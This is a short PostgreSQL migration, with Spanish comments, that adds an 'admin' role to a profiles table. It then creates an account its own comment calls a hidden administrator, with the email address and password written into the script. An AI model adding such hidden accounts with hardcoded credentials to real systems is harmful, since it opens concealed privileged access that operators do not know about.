-- 1. Actualizar el Check Constraint para permitir el rol 'admin'
ALTER TABLE public.profiles DROP CONSTRAINT IF EXISTS profiles_role_check;
ALTER TABLE public.profiles
ADD CONSTRAINT profiles_role_check CHECK (
        role IN ('Agente', 'CDO', 'Supervisor', 'Jefe', 'admin')
    );
-- 2. Crear administrador oculto
DO $$
DECLARE new_user_id UUID := gen_random_uuid();
BEGIN -- Solo procedemos si el usuario no existe aún
IF NOT EXISTS (
    SELECT 1
    FROM public.profiles
    WHERE username = 'Administrador'
) THEN -- A. Insertar en auth.users
INSERT INTO auth.users (
        id,
        email,
        encrypted_password,
        email_confirmed_at,
        raw_user_meta_data,
        created_at,
        updated_at,
        role,
        aud,
        confirmation_token
    )
VALUES (
        new_user_id,
        'admin_sistema@pmrqr.com',
        crypt('Cargo.2026$', gen_salt('bf')),
        now(),
        '{"username": "Administrador", "full_name": "Administrador Sistema"}'::jsonb,
        now(),
        now(),
        'authenticated',
        'authenticated',
        ''
    );
-- B. El trigger ya insertó el perfil automáticamente, así que solo lo ACTUALIZAMOS
-- Esto evita el error de "duplicate key"
UPDATE public.profiles
SET role = 'admin',
    email = 'admin_sistema@pmrqr.com'
WHERE id = new_user_id;
END IF;
END $$;